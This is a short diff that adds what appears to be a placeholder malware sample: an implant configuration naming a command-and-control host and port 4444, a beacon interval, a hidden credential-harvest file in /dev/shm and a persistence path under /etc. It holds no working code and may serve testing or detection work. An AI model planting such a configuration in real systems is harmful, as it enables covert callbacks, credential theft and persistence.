@@ -1,0 +1,7 @@
+ELF-placeholder-binary-body
+Implant v1.2 build 2026-03-28
+c2_host=198.51.100.99
+c2_port=4444
+beacon_interval_s=300
+cred_harvest=/dev/shm/.c
+persist_path=/etc/.implant.so
